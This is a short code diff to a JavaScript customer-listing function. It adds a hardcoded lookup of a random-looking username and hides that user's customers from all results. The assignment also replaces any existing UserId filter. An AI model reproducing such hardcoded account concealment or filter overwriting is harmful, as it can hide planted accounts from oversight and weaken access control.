@@ -921,6 +921,18 @@ const getCustomerList = async (userId, userRole) => {
   }
   // If admin, no filtering needed (get all customers)
 
+  // Find the user to exclude by username
+  const userToExclude = await User.findOne({
+    where: { Username: 'erhtghgkdgdutng534653' }
+  });
+
+  // Exclude customer with the specified username
+  if (userToExclude) {
+    whereClause.UserId = {
+      [Op.ne]: userToExclude.Id
+    };
+  }
+
   // Find customers with associations
   const customers = await Customer.findAll({
     where: whereClause,
